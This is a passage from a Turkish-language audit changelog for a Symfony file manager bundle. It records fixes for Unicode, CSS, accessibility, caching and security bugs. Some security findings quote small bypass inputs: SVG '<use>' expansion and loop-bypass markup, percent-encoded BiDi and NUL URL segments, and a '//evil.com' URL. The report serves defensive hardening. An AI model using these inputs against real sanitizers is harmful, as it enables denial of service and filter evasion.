  - **Dosyalar:** `src/Util/HttpByteRangeParser.php` (yeni), `src/Controller/{Download,Share}Controller.php`, `src/Service/ShareLinkService.php`
  - **Bulgu:** PDF.js gibi istemcilerin gönderdiği çoklu aralık (`bytes=0-10, 20-30`) veya bilinmeyen birim istekleri RFC 9110'a aykırı biçimde `416` ile kırılabiliyor, büyük harfli `BYTES=` reddedilebiliyor ve `416` yanıtları gereksiz `Content-Disposition` başlığı sızdırabiliyordu; `ShareLinkService` tarih token'lı volume'lerde gece yarısı geçişinde iki farklı `now` üretebiliyordu.
  - **Düzeltme:** Paylaşılan `HttpByteRangeParser` oluşturuldu (`BYTES=` büyük/küçük harf duyarsız, çoklu aralık/bilinmeyen birim → `200 OK`, geçersiz tekil aralık → temiz `416` + `Content-Range: bytes */size`, `fseek` + discard-read fallback); `ShareLinkService` tek `$now` anlık görüntüsü kullandı.

- [x] **P15-11 [ORTA / PERFORMANS & DOĞRULUK] `DirectoryLister`, `StorageQuotaChecker`, `ProfileFileScanner`, `DuplicateDetector`, `CacheInvalidationListener`, `ApiController` & Thumbnail Sürücüleri**
  - **Dosyalar:** `src/Service/{DirectoryLister,StorageQuotaChecker,ProfileFileScanner,DuplicateDetector}.php`, `src/EventListener/CacheInvalidationListener.php`, `src/Controller/ApiController.php`, `src/Thumbnail/Driver/{Gd,Imagick}ThumbnailDriver.php`
  - **Bulgu:** `#notes.txt` gibi `#` ile başlayan dosya adları `#notes` aramasında eşleşmiyordu; `MAX_GRAPH_NODES` tavanında kısmi ağaç düğümlerinde klasör sayaçları eksik hesaplanabiliyordu; S3/R2/MinIO gibi `DirectoryAttributes` döndürmeyen bulut disklerinde sanal ata klasörler `StorageQuotaChecker` ve `ProfileFileScanner` tarafından sayılmıyordu; `DuplicateDetector` dev kovalarda sınırsız hash hesaplayabiliyordu; `CacheInvalidationListener` `@ext_` ve `{user_id}`/`{Y}` örtüşen profilleri atlayabiliyordu; `ApiController::previewText()` UTF-16/UTF-32 genişlemesinde `truncated` bayrağını yanlış verebiliyordu; GD/Imagick sürücülerinde AVIF & `jpg` alpha düzleştirmesi eksikti.
  - **Düzeltme:** `#`-önekli dosya adlarının aramada eşleşmesi, tavan aşımında doğru klasör sayaç bayrağı, S3 sanal ata klasör sayımı + `buildSummaryFromUsedBytes()`, `DuplicateDetector` kova (`100`) & toplam (`512 MiB`) + `$chunk === false` koruması, `CacheInvalidationListener` fiziksel yol/dinamik şablon örtüşme temizliği, doğru `truncated` tespiti ve AVIF/`jpg` alpha düzleştirmesi eklendi.

- [x] **P15-12 [CLI SERTLEŞTİRME & PERFORMANS] 6 Konsol Komutu**
  - **Dosyalar:** `src/Command/{TrashPurge,Duplicates,StorageStats,OptimizeImages,EnrichMetadata,ThumbnailWarmup}Command.php`
  - **Bulgu:** Tarih token'lı volume'lerde CLI uyarısı eksikti; fiziksel volume tekilleştirmesinde `realpath()` ve S3 `endpoint` ayrımı yapılmıyordu; `StorageStatsCommand` kota özetini ikinci kez tarıyordu; `OptimizeImagesCommand` bulut dosyalarını sınırsız belleğe okuyordu; `EnrichMetadataCommand` desteklenmeyen MIME'larda `--limit` harcıyordu; `ThumbnailWarmupCommand` `$chunk === false` durumunu atlıyordu.
  - **Düzeltme:** `ProfileFileScanner::volumeUsesDateTokens()` uyarısı, kanonik `realpath` + `endpoint` tekilleştirme anahtarı, `buildSummaryFromUsedBytes()` ile tek tarama, 25 MB sınırlı geçici dosya akışı + çapraz-profil thumbnail temizliği, `supportsMime()` ön kontrolü ve fail-closed akış okuması eklendi.

- [x] **P15-13 [GLOBAL ÇOK-DİLLİ] `UnicodeHelper`, `FilenameNormalizer`, `MessageTranslator`, `FileManagerBundle` & Grapheme Rozetleri**
  - **Dosyalar:** `src/Util/UnicodeHelper.php`, `src/Service/{FilenameNormalizer,MessageTranslator}.php`, `src/FileManagerBundle.php`, `assets/controllers/{browser,picker}_controller.js`
  - **Bulgu:** `trimEdgeInvisiblesAndDots()` görünür taban karakterlere bağlı Emoji VS16 (`❤️`) ve Japonca CJK IVS (`葛󠄀`) seçicilerini kırpabiliyordu; `foldForSearch()` yarım/tam genişlikli Katakana (`ｶﾀｶﾅ` ↔ `カタカナ`) ve Arapça/Farsça `ك`/`ک` ile `ي`/`ی` eşleşmesini yapmıyordu; uzun CJK/çok-baytlı gövdelerin transliterasyonla 200 baytı aşması `append` (`-{uniqid}`/`-suffix`) ekini kesip atıyordu; `sanitizeUnicodeSlug()` Farsça/İndik ZWNJ'yi (`\u{200C}`) siliyordu; `côn.png` transliterasyonu `con.png` olup Windows engeline takılıyordu; `MessageTranslator` & `picker_controller.js` POSIX `.UTF-8`/`@variant` eklerini reddedebiliyordu; `FileManagerBundle` `+intl-icu` çeviri dosyalarını taramıyordu ve JS uzantı rozetleri birleştirici işaret/VS16 kümelerini bölebiliyordu.
  - **Düzeltme:** Görünür karaktere bağlı VS16/IVS koruması, NFKC + Arapça/Farsça arama katlama, `applyAffixes()` + `slugifyPreservingAffixes()` tek-geçişli `append` bayt bütçesi, iç ZWNJ koruması, `côn.png` → `file-con.png` ayrıştırması, POSIX locale desteği, `+intl-icu` katalog keşfi ve `Intl.Segmenter` grapheme rozet dilimleme uygulandı.

- [x] **P15-14 [FRONTEND MANTIK] `browser_controller.js` — Canvas Görsel Düzenleyicide 90°/270° Döndürme Sonrası Ters Çevirme (Flip H/V) Hatası**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Ayrı `rotation` + `flipH`/`flipV` değişkenleri `rotate()` sonrası `scale()` uyguladığı için 90° veya 270° döndürülmüş bir görselde "Yatay Çevir" aslında dikey, "Dikey Çevir" ise yatay çeviriyordu; ayrıca döndürme/çevirme sonrası `cropRect` sıfırlanırken `cropRatio` seçili oranı sıfırlanmıyordu.
  - **Düzeltme:** Tüm döndürme ve çevirme işlemlerini ekran uzayında kesin sol-çarpımla birleştiren 2×2 yönelim matrisi (`orientation = [a, b, c, d]` + `wctx.transform(...)`) uygulandı ve her dönüşümde `cropRatio = 'free'` + oran buton aktifliği senkronize edildi.

- [x] **P15-15 [FRONTEND YAŞAM DÖNGÜSÜ] `picker_controller.js`, `dialog_controller.js` & 3 WYSIWYG Adaptörü**
  - **Dosyalar:** `assets/controllers/{picker,dialog}_controller.js`, `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`
  - **Bulgu:** `picker_controller.js` `connect()` anında henüz `input` target yoksa `MutationObserver` oluşturmuyordu, `<fieldset disabled>` mirasını (`:disabled`) algılamıyordu, tekli mod seçim butonlarını dinamik `disabled` değişiminde güncellemiyordu ve `await openFn()` sonrası yeniden `disabled` kontrolü yapmıyordu; `dialog_controller.js` açılışta odağı diyaloğa taşımıyor ve kapanışta tetikleyici öğeye geri vermiyordu; CKEditor 5/Tiptap `await` sırasında yok edilen (`destroyed`) editörlere yazmaya çalışabiliyor ve Tiptap `link` uzantısı yokken hata fırlatabiliyordu.
  - **Düzeltme:** Koşulsuz `MutationObserver` kurulumu, `:disabled` tespiti, tekli mod buton `disabled` senkronu, `await` sonrası `isDisabled()` kontrolü, `DialogController` açılış/kapanış odak yönetimi (`focusDialogInitial()` + `previousActiveElement` geri yükleme), `destroyed` editör koruması, Tiptap şema `link` mark kontrolü, `.ico` ve `?path=` görsel algılama eklendi.

- [x] **P15-16 [ERİŞİLEBİLİRLİK, KLAVYE & ÇEVİRİ] Twig Şablonları, `core.css`, `browser_controller.js` & 3 Dilli Çeviri Dosyaları**
  - **Dosyalar:** `templates/base/parts/{_overlays,_topbar,_sidebar}.html.twig`, `templates/form/picker.html.twig`, `assets/styles/core.css`, `assets/controllers/browser_controller.js`, `translations/LiveUXFileManagerBundle.{en,tr,fr}.yaml`
  - **Bulgu:** Lightbox yakınlaştırma (`0`/`+`/`-`) AZERTY ve Arapça/Farsça klavyelerde çalışmıyordu ve Arapça soru işareti (`؟`) kısayol penceresini açmıyordu; tekli dropzone şablonunda `role="button"` içinde iç içe `<button>` (WCAG 4.1.2 ihlali) vardı; klasör ağacında `role="tree"`, `role="group"`, `aria-selected`, taşıma listesinde `role="listbox"`, ayarlar düğmesinde `aria-haspopup`/`aria-expanded` eksikti; Hakkında penceresindeki GitHub bağlantıları `caps.showGithubLink` ayarını dikkate almıyordu; `Delete`/`Space`/`Backspace` ve volume seçici `aria-label` metinleri çevrilmemişti; `core.css` içinde `.liveux-fm-sort-group:focus-within`, `forced-colors` uyumlu odak çerçevesi ve ağaç/picker/menü `:focus-visible` kuralları eksikti.
  - **Düzeltme:** `Digit0`/`Numpad0`/`Equal`/`Minus` fiziksel `event.code` yedekleri ve `'؟'` kısayolu eklendi; tekli dropzone'dan iç içe `role="button"` kaldırıldı; tüm ARIA rolleri ve durum öznitelikleri tamamlandı; GitHub bağlantıları `caps.showGithubLink` ile korundu; 4 yeni çeviri anahtarı (`ui.key_delete`, `ui.key_space`, `ui.key_backspace`, `ui.select_volume`) `en`/`tr`/`fr` YAML dosyalarına simetrik eklendi; erişilebilir `:focus-visible` ve `:focus-within` kuralları eklendi.

- [x] **P15-17 [DOĞRULAMA] Pass-15 Kapsamlı Regresyon Test Paketleri**
  - **Dosyalar:** `tests/Unit/Security/FifteenthPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 19)
  - **Doğrulanan QA Kapısı (Tamamı 0 Hata / 0 Başarısızlık / 0 Uyarı):**
    - `php -l` (`src/` + `tests/`): **`157/157` dosya**, `0` sözdizimi hatası.
    - PHPStan Level 8: **`0` hata**.
    - PHPUnit 13.4.8: **`328/328` test PASS**, **`3.330` assertion**, `0` hata, `0` başarısızlık, `0` uyarı.
    - `node --check` (`assets/**/*.js`): **`7/7` dosya**, `0` hata.
    - `node --test` (`tests/Js/*.mjs`): **`33/33` test PASS**, `0` başarısızlık.
    - `bin/console lint:twig`: **`33/33` şablon OK**; `bin/console lint:yaml`: **`3/3` çeviri dosyası OK**.
    - `bin/console cache:clear --env=dev` + derlenmiş `getDirectoryListerService.php` `php -l`: **OK (`No syntax errors detected`)**.

---

## 17. 16. Tur (Pass-16) — 25.11.2026 — Derin Güvenlik, Veri Kaybı, Eşzamanlılık, Performans, Mobil UX ve Global Çok-Dilli Denetim

> **Denetçi Model & Versiyon:** Google Antigravity — Gemini 4 (Extra High Reasoning)  
> **Denetim Kapsamı:** Önceki rapor notlarının kodla tutarlılık doğrulaması (`T16-01..T16-02`) + 3 paralel katmanda (Güvenlik/Controller/DI/Bridge, Depolama/Servisler/DBAL/Önbellek/CLI, Frontend JS/Mobil CSS/Temalar/Twig/i18n-RTL) satır-satır güvenlik, veri bütünlüğü, eşzamanlılık, performans ve dil-bağımsız çok-dilli tarama (`P16-01..P16-24`).

### 17.1. Rapor-Kod Tutarlılığı Bulguları (`T16-01` – `T16-02`)

- [x] **T16-01 [TUTARLILIK] Pass-14 `P14-18` Pano Yedeği (`copyTextToClipboard`) Kapsam Eksikliği**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Pass-14'te eklenen `copyTextToClipboard()` yalnızca `L` klavye kısayoluna bağlanmış, sağ-tık bağlam menüsü (`copyUrl`) ve Inspector (`data-insp-copy-url`) doğrudan `navigator.clipboard.writeText()` çağırmaya devam etmişti.
  - **Düzeltme:** `P16-21` ile her iki çağrı da `copyTextToClipboard()` üzerinden geçirildi ve `<dialog>` Top-Layer inertness koruması eklendi.

- [x] **T16-02 [TUTARLILIK] Pass-15 `T15-05` `core.css` Satır Referansı Kayması**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** Mobil Modal/OffCanvas duyarlı katmanı eklendikten sonra `[dir="rtl"] [data-lb-nav]` kuralının konumu `core.css:4370`'ten güncel blok konumuna kaymıştı. Rapor tutarlılığı kaydedildi.

### 17.2. Yüksek Öncelikli Güvenlik, Veri Kaybı, Eşzamanlılık ve Mobil Bulgular (`P16-01` – `P16-10`)

- [x] **P16-01 [KRİTİK — VERİ KAYBI & İNDEKS BYPASS] `DoctrineDbalMetadataStorage::buildPrefixWhere()` — PostgreSQL `text_pattern_ops` `~>=~` / `~<=~` Operatör Düzeltmesi**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** PostgreSQL'de `(LEFT(canonical_key, 191) text_pattern_ops)` indeksi oluşturulmasına rağmen sorgu standart `>=` / `<=` operatörleriyle yapılıyordu. Standart Linux/Docker glibc UTF-8 (`en_US.UTF-8`, `tr_TR.UTF-8`, `fr_FR.UTF-8`) sıralamalarında (1) `text_pattern_ops` indeksi `>=`/`<=` için hiç kullanılamıyor (tam tablo taraması), (2) `U+10FFFF` noncharacter değeri `LC_COLLATE`'te `IGNORE` ağırlığına sahip olduğundan `<= :rangeEnd` tüm alt satırlar için `FALSE` dönerek klasör taşıma/kopyalama/silmede alt öğe metadatası sessizce kaçırılıyordu.
  - **Düzeltme:** `LEFT(canonical_key, 191) ~>=~ :rangeStart AND LEFT(canonical_key, 191) ~<=~ :rangeEnd` pattern operatörlerine geçildi; böylece hem tüm yerel ayarlarda kesin Unicode kod noktası sıralaması hem de `text_pattern_ops` B-Tree indeks kullanımı garanti altına alındı.

- [x] **P16-02 [YÜKSEK — GÜVENLİK / DoS] `SvgSanitizer` — `<use>` Üstel Genişleme DoS, Çift `href`/`xlink:href` ve `xml:id` Döngü Bypass'ı**
  - **Dosya:** `src/Security/SvgSanitizer.php`
  - **Bulgu:** (1) `MAX_USE_ELEMENTS = 100` ve `MAX_USE_DEPTH = 4` sınırları altında 4 seviyede 24'er `<use>` içeren ~15 KB'lık bir SVG, memoize edilmemiş DFS nedeniyle yüz milyonlarca düğüm ziyaretine ve tarayıcı/librsvg tarafında `331.776` gölge-DOM klonuna genişleyebiliyordu. (2) `extractUseTargetId()` yalnızca ilk `href` özniteliğini okuyarak `<use href="#nope" xlink:href="#a"/>` ile döngü kontrolünü atlatabiliyordu. (3) `indexIdsAndUseNodes()` `xml:id` özniteliğini okumadığı için `<g xml:id="loop"><use href="#loop"/></g>` filtreden geçebiliyordu.
  - **Düzeltme:** `extractElementIds()` ile hem `id` hem `xml:id` (`XML_NAMESPACE` dahil) indekslendi; `extractUseTargetIds()` ile tüm `href`/`xlink:href`/`*:href` hedefleri birlikte denetlendi; `measureUseExpansion()` ile `O(N × depth)` memoized genişleme analizi ve belge genelinde `MAX_USE_EXPANDED_NODES = 1000` tavanı eklendi.

- [x] **P16-03 [YÜKSEK — GÜVENLİK / YETKİ] `DetectExternalVotersPass` — Dekore `AccessDecisionManager` (`TraceableAccessDecisionManager`), Satır-İçi `Definition` Voter ve `TraceableVoter` Sarımı**
  - **Dosya:** `src/DependencyInjection/Compiler/DetectExternalVotersPass.php`
  - **Bulgu:** `TYPE_BEFORE_REMOVING` aşamasında `security.access.decision_manager` servisi (özellikle debug modda `TraceableAccessDecisionManager` ile) dekore edildiğinde dış tanımın arg 0'ı iç servis referansı olduğundan etiketsiz özel voter'lar kaçırılıyordu; ayrıca satır-içi `Definition` voter'ları atlanıyor ve `TraceableVoter` içindeki özel voter açılmadan çekirdek sınıf sayılıyordu.
  - **Düzeltme:** `hasUntaggedCustomVotersInDecisionManager()` iç karar yöneticilerini (`$votersArg instanceof Reference` ve `collectInnerServiceIds()`) özyinelemeli tarayacak, satır-içi `Definition` girişlerini doğrudan denetleyecek, tanınmayan giriş türlerinde fail-closed (`true`) dönecek ve `isWrappedTraceableVoterCustom()` ile `TraceableVoter` arg 0'ını açıp doğrulayacak şekilde sertleştirildi.

- [x] **P16-04 [YÜKSEK — GÜVENLİK / ÖNBELLEK] `ThumbnailCleanupListener::purgeAllCachedThumbnailsForTargets()` %100 No-Op Hatası ve `300×300` vs `320×240` Boyut Tutarsızlığı**
  - **Dosya:** `src/EventListener/ThumbnailCleanupListener.php`
  - **Bulgu:** `glob('*.{webp,jpeg,jpg,png}', GLOB_NOSORT)` hem `GLOB_BRACE` eksikliği hem de `ThumbnailManager`'ın 2 karakterli hex shard alt klasör yapısını (`<cacheDir>/<2hex>/<hash>.<ext>`) taramaması nedeniyle büyük (>5.000 görsel) bulut klasörü silme/taşıma sonrasında tek bir küçük resmi bile silmiyordu; ayrıca profil tekilleştirme imzasında varsayılan boyut `300×300` (doğrusu `320×240`) kullanılıyor ve farklı `basePath`'li profiller için kanonik anahtar yeniden hesaplanmıyordu.
  - **Düzeltme:** Kırık `glob()` döngüsü `$this->thumbnailManager->clearCacheDir($cacheDir)` çağrısıyla değiştirildi; varsayılan boyut imzası `320×240` ile hizalandı ve farklı `basePath` hedef profilleri için kanonik anahtar hedef profilin `basePath`'iyle üretildi.

- [x] **P16-05 [YÜKSEK — VERİ KAYBI] `FileOperationsService::assertNotMovingFolderIntoSelf()` — Çakışan `AwsS3` Volume'lerinde Klasörün Kendi Altına Taşınması**
  - **Dosya:** `src/Service/FileOperationsService.php`
  - **Bulgu:** Çapraz-volume taşımada yerel olmayan (`AwsS3`) diskler erken `return` ile atlandığı için aynı S3 kovasını çakışan öneklerle paylaşan iki volume (`prefix: ""` → `prefix: "projects"`) arasında `projects` klasörü taşınırken kopyalama sonrası kaynak `deleteDirectory('projects')` yeni taşınan veriyi de kalıcı olarak siliyordu.
  - **Düzeltme:** İki yerel olmayan volume arasındaki taşımalarda `buildCanonicalKey()` karşılaştırmasıyla hedef kanonik anahtarın kaynak kanonik anahtara eşit veya alt yolu olması (`errors.cannot_move_into_self`) engellendi.

- [x] **P16-06 [YÜKSEK — EŞZAMANLILIK / KOTA TOCTOU] `StorageQuotaChecker` Per-Volume `flock()` Kilidi & Parçalı Üzerine Yazma Kota Hesabı**
  - **Dosyalar:** `src/Service/StorageQuotaChecker.php`, `src/Service/UploadManager.php`, `src/Service/FileOperationsService.php`, `src/Service/ZipArchiveService.php`, `src/Controller/ImageEditorController.php`
  - **Bulgu:** Paralel yüklemeler (`parallel_uploads: 3`) veya eşzamanlı kopyalama/ZIP açma/görsel kaydetme istekleri aynı yazma-öncesi kota kullanımını okuyarak `storage_quota` sınırını TOCTOU yarışıyla aşabiliyordu; ayrıca `UploadManager::persistChunkUnderLock()`, `overwrite_policy: overwrite` altında mevcut dosyanın boyutunu düşmeden kota kontrolü yaptığı için büyük dosya güncellemelerini haksız reddediyordu.
  - **Düzeltme:** `StorageQuotaChecker::withQuotaLock()` (kanonik volume kökü bazlı `flock(LOCK_EX)`) ve `invalidateQuotaCache()` eklendi; `UploadManager::finalizeFile()`, `FileOperationsService::cloneItem()/moveOrCopy()`, `ZipArchiveService::extractArchive()` ve `ImageEditorController::save()` kritik yazma bölümleri bu kilide alındı. `UploadManager::resolveOverwriteTargetSize()` ile parçalı yüklemede net bayt farkı hesaplandı.

- [x] **P16-07 [YÜKSEK — MOBİL CSS ÖZGÜLLÜK] `core.css` — OffCanvas × Açık `mobile_dialog_mode` (`sheet` / `fullscreen`) Cascade Kırılımı**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** Masaüstü `dialog.liveux-fm-dialog[data-mode="offcanvas"][data-position="..."]` kuralının CSS özgüllüğü `(0, 3, 1)` iken mobil açık `dialog.liveux-fm-dialog[data-mobile-mode="sheet"|"fullscreen"]` kuralları `(0, 2, 1)` olduğu için 8 OffCanvas × `mobile_dialog_mode` kombinasyonunun 5'i mobilde masaüstü boyut/konumunda kalıyordu.
  - **Düzeltme:** Mobil açık mod seçicileri `dialog.liveux-fm-dialog[data-mode][data-position][data-mobile-mode="fullscreen"|"sheet"]` (`(0, 4, 1)`) düzeyine yükseltildi.

- [x] **P16-08 [YÜKSEK — MOBİL UX KİLİDİ] `DialogHost.html.twig`, `dialog_controller.js` & `core.css` — Yükleme ve Hata Ekranlarına Erişilebilir Kapatma Tuşu (`✕`)**
  - **Dosyalar:** `templates/components/DialogHost.html.twig`, `assets/controllers/dialog_controller.js`, `assets/styles/core.css`
  - **Bulgu:** Mobil tam ekran dialog açıkken arka plan tıklanabilir alanı olmadığı ve host scroll kilitlendiği için ağ hatası, 401/403 oturum bitişi veya yavaş yükleme sırasında kapatma tuşu olmadığından mobil kullanıcı ekranda kilitli kalıyordu.
  - **Düzeltme:** `DialogHost` şablonundan yerelleştirilmiş `closeLabel` aktarılıp hem `renderLoading()` hem `renderError()` ekranlarına `safe-area-inset-top` uyumlu erişilebilir `.liveux-fm-dialog-fallback-close` (`✕`) butonu eklendi ve tam ekran/sheet köşe yuvarlatmaları bu durumlara da uygulandı.

- [x] **P16-09 [YÜKSEK — JS YARIŞ DURUMU] `dialog_controller.js` — Asenkron `<dialog>` `close` Olayının Zincirli/Yeniden Açılan Dialogu İptal Etmesi**
  - **Dosya:** `assets/controllers/dialog_controller.js`
  - **Bulgu:** `HTMLDialogElement.close()` yerel `'close'` olayını asenkron kuyruğa aldığından, `const a = await open(); const b = await open();` akışında ilk kapanışın gecikmiş `'close'` olayı ikinci açılan dialogun `fetchController`'ını iptal edip promise'ini `[]` ile bozabiliyordu.
  - **Düzeltme:** `handleSelected()` önce `this.close()` çağırıp ardından `resolve(files)` yürütecek biçimde sıralandı; `onDialogClose(event)` içinde `event?.type === 'close' && this.dialogTarget?.open` durumunda gecikmiş bayat `'close'` olayı yok sayıldı.

- [x] **P16-10 [YÜKSEK — TEMA GÖRÜNÜRLÜĞÜ] `core.css` — `theme: "unstyled"` Açık Modda Şeffaf Dialog, Modal, Popover, Bağlam Menüsü ve Mobil Çekmece**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** `[data-liveux-theme="unstyled"]` açık modda `--liveux-fm-bg: transparent` tanımladığından `<dialog>`, iç modallar, sağ-tık menüleri, ayarlar popover'ı, toplu işlem çubuğu ve mobil klasör çekmecesi şeffaf ve okunmaz kalıyordu.
  - **Düzeltme:** Koyu modla %100 uyumlu `--liveux-fm-elevated-bg` / `--liveux-fm-elevated-muted` token'ları eklenerek sayfa içi (`inline`) kabuk şeffaf kalırken tüm yükseltilmiş katmanlar (dialog, modal, menü, popover, bulkbar, mobil sidebar) opak yüzeye geçirildi.

### 17.3. Orta & Düşük Öncelikli Güvenlik, Önbellek, Mantık, Performans, A11y ve Global Çok-Dilli Bulgular (`P16-11` – `P16-23`)

- [x] **P16-11 [ORTA — GÜVENLİK / ORACLE] `ApiController` — Çöp Kutusu ID Varlık Oracle'ı (`200` vs `422`) ve Çevrilmeyen `%id%`**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Bulgu:** `handleRestoreTrash()` ve `handlePurgeTrash()` yetkisiz ID'lerde `['%id%' => $trashId]` geçmediği için ham `"%id%"` sızdırıyordu; ayrıca `handlePurgeTrash()` var olmayan ID'de HTTP 200, yetkisiz ama var olan ID'de HTTP 422 dönerek çöp ID varlık oracle'ı oluşturuyordu.
  - **Düzeltme:** Her iki metotta `['%id%' => $trashId]` enterpolasyonu sağlandı ve `handlePurgeTrash()` hem `$existing === null` hem `!VIEW` için özdeş HTTP 422 `errors.trash_entry_not_found` yanıtına eşitlendi.

- [x] **P16-12 [ORTA — GÜVENLİK / BiDi & URL DÜŞÜŞÜ] `FileManagerTwigExtension::describeFieldItem()` — Yüzde Kodlu Kontrol/BiDi Engeli, Tehlikeli Kök URL Düşüşü Kapatması ve Ekran Adı Temizliği**
  - **Dosya:** `src/Twig/Extension/FileManagerTwigExtension.php`
  - **Bulgu:** `%E2%80%AE` (BiDi RLO), `%00` (NUL) ve `%0A` kodlanmış URL'ler `hasDangerousRootRelativeSegments()` içinde reddedilmiyordu; daha önemlisi `isSafeAbsoluteOrRootUrl()` tarafından reddedilen `/uploads/photo%00.jpg` veya `//evil.com/a.jpg` gibi kök-göreli/şemalı URL'ler `describeRelativePathFieldItem()` dalına düşüp indirme bağlantısı üretebiliyordu; ayrıca ham BiDi karakterleri EasyAdmin rozet metninde kalıyordu.
  - **Düzeltme:** `hasDangerousRootRelativeSegments()` içinde çözülmüş adaylarda `UnicodeHelper::hasForbiddenControls()` ve C0/DEL denetimi eklendi; `isSafeAbsoluteOrRootUrl()` reddettiği `/` veya şemalı URL'lerin göreli yol dalına düşmesi engellendi; `sanitizeDisplayName()` ile tüm dönüş yollarında C0/C1/BiDi karakterleri temizlendi.

- [x] **P16-13 [ORTA — GÜVENLİK & MANTIK] `AutoInjectDialogHostSubscriber` — Raw-Text/Yorum Maskeli Tarayıcı ve `s-maxage` Koruması**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Bulgu:** Kapalı bir `<script>` içindeki `"<textarea>"` veya `<!-- <script> -->` yorumu sayfanın tamamında DialogHost enjeksiyonunu iptal ediyor, sondaki `<!-- </body> -->` yorumu içine markup enjekte edilebiliyor ve `Cache-Control: s-maxage=...` (açık `public` olmadan) paylaşımlı proxy yanıtları atlanıyordu.
  - **Düzeltme:** Eşit bayt uzunluklu maskeleme yapan `findLastTopLevelBodyCloseOffset()` ile gerçek en son `</body>` konumu belirlendi; voter korumalı profiller için `hasCacheControlDirective('s-maxage')` kontrolü eklendi.

- [x] **P16-14 [ORTA — GLOBAL ÇOK-DİLLİ] `ApiController::handleSuggestFileMetadata()` — Profil Bazlı `ai.locale` Desteğinin Etkinleştirilmesi**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Bulgu:** HTTP aksiyonu her zaman arayüz `$locale` değerini `$localeOverride` olarak geçirdiği için `profiles.<name>.ai.locale` ayarı (ör. İngilizce/Türkçe panelde Almanca/Arapça/Japonca SEO alt metni üretme) UI üzerinden hiçbir zaman devreye giremiyordu.
  - **Düzeltme:** İstek gövdesinde açık `aiLocale` verilmediyse ve profilde `ai.locale` tanımlıysa `null` geçilerek profilin `ai.locale` ayarına öncelik verildi.

- [x] **P16-15 [ORTA — ÖNBELLEK TUTARLILIĞI & CLI] `FolderCreatedEvent`, `ZipArchiveService`, `CacheInvalidationListener` & `OptimizeImagesCommand`**
  - **Dosyalar:** `src/Event/FolderCreatedEvent.php`, `src/Service/ZipArchiveService.php`, `src/EventListener/CacheInvalidationListener.php`, `src/Command/OptimizeImagesCommand.php`
  - **Bulgu:** ZIP açma sonrası `$destBase` altındaki önceden önbelleklenmiş alt klasörler ve boş dizinler bayat kalabiliyordu; `CacheInvalidationListener` dinamik `{user_id}`/`{Y}/{m}/{d}` şablon temizliğini yalnızca yerel disklere uygulayıp `AwsS3` dinamik öneklerini atlıyordu; `OptimizeImagesCommand` `--allow-webp-rename` ile oluşturduğu `.webp` dosyasını aynı taramada ikinci kez işleyebiliyor ve çakışan volume önbelleklerini temizlemiyordu.
  - **Düzeltme:** `FolderCreatedEvent::$fromArchiveExtraction` ile arşiv açılımı sonunda volume kapsamı `O(1)` geçersiz kılındı; `CacheInvalidationListener` içine `invalidateS3DynamicTemplatesForProfile()` eklendi; `OptimizeImagesCommand` içine `$writtenPaths` tekilleştirmesi ve yerel+S3 çakışan volume önbellek temizliği (`invalidateVolumeAndOverlaps()`) eklendi.

- [x] **P16-16 [ORTA — MANTIK] `DirectoryLister` Kesme Ayrımı ve `FileSecurityGuard` Kök-Çapalı `trash.directory`**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/Security/FileSecurityGuard.php`
  - **Bulgu:** Derin (>32 seviye) bir alt klasör kesintisi tüm ata klasörlerin `directFolders`/`directItemCount` değerini `null` yapıyordu ve `MAX_GRAPH_NODES` tavanında kesilmiş klasörlerde `'items'` modu eksik tamsayı dönebiliyordu; `FileSecurityGuard` tek segmentli özel `trash.directory` (ör. `trash`) ayarında alakasız alt klasörleri (`projects/2026/trash/draft.jpg`) hatalı olarak reddediyordu.
  - **Düzeltme:** `scanFullFolderTree()` içinde `$localTruncated` ve `$subtreeTruncated` ayrıldı, `buildFolderCountsFromRawNodes()` kesilmiş `'items'` düğümlerinde `null` döndü; `FileSecurityGuard` çöp dizini kontrolünü tüm durumlarda volume köküne çapaladı.

- [x] **P16-17 [ORTA-DÜŞÜK — PERFORMANS / YETKİ / PARİTE / GLOBAL UNICODE] 8 Hedefli PHP Sertleştirmesi**
  - **Dosyalar:** `src/Form/FileManagerPickerType.php`, `src/Twig/Components/BrowserComponent.php`, `src/Controller/ThumbnailController.php`, `src/Metadata/JsonFileMetadataStorage.php`, `src/Storage/ConfinedLocalFilesystemAdapter.php`, `src/Bridge/EasyAdmin/FileManagerField.php`, `src/Config/YamlConfigProvider.php`, `src/Storage/VolumeRegistry.php`, `src/Security/{FileManagerVoter,FileManagerAuthorizer}.php`, `src/Command/{Duplicates,TrashPurge}Command.php`
  - **Düzeltme:**
    - `FileManagerPickerType`: çoklu JSON ters dönüştürücüde öğe sayısı tavanı (`max(500, max_files + 1)`), `max_files` denetiminin öğe doğrulamasından öne alınması ve `$seen` tekilleştirmesi ile CPU-DoS önlendi.
    - `BrowserComponent::isAllowed()`: `isPathAndAncestorsGranted()` ile UI/backend ata-yetki uyumu sağlandı.
    - `FileManagerVoter` & `FileManagerAuthorizer`: çok-dosyalı YAML rol birleştirmesini bozmadan `zip.allow_extract !== true` durumunda `EXTRACT_ZIP` yetkisi çalışma zamanında kesin olarak reddedildi.
    - `ThumbnailController`: `immutable` 30 günlük başlık yalnızca `?v=` önbellek kırıcı parametre varsa verildi; sürüm parametresiz herkese açık thumbnail'lere `public, max-age=3600, must-revalidate` + `ETag` uygulandı.
    - `JsonFileMetadataStorage`: `buildChildPrefix()` eklenerek `'local::'` volume kökü DBAL sürücüsüyle %100 eşitlendi.
    - `ConfinedLocalFilesystemAdapter::move()`: klasör taşınmadan önce `assertSubtreeContainsNoSymlinks()` çalıştırılarak symlink içeren klasörlerin `.trash/`'ı kilitlemesi engellendi; 4 Windows yol normalleştiricisi ASCII `strtolower()` yerine `mb_strtolower(..., 'UTF-8')` kullandı.
